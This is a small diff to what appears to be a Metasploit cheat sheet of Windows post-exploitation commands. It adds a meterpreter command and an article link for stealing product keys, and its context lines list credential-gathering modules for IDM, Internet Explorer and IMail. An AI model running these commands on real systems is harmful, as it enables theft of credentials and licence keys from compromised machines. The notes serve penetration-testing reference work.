@@ -4,6 +4,11 @@ https://github.com/rapid7/metasploit-framework/tree/master/documentation (refer 
 
 ## Windows Gather Modules
 
+https://www.yeahhub.com/steal-windows-product-key-remotely-metasploit-framework/
+
+```
+meterpreter > run post/windows/gather/enum_ms_product_keys
+```
 
 run post/windows/manage/powershell/load_script
 
@@ -108,7 +113,7 @@ run post/windows/gather/credentials/idm
 
 run post/windows/gather/credentials/ie
 
-run post/windows/gather/enum_ms_product_keys
+
 
 run post/windows/gather/credentials/imail
 
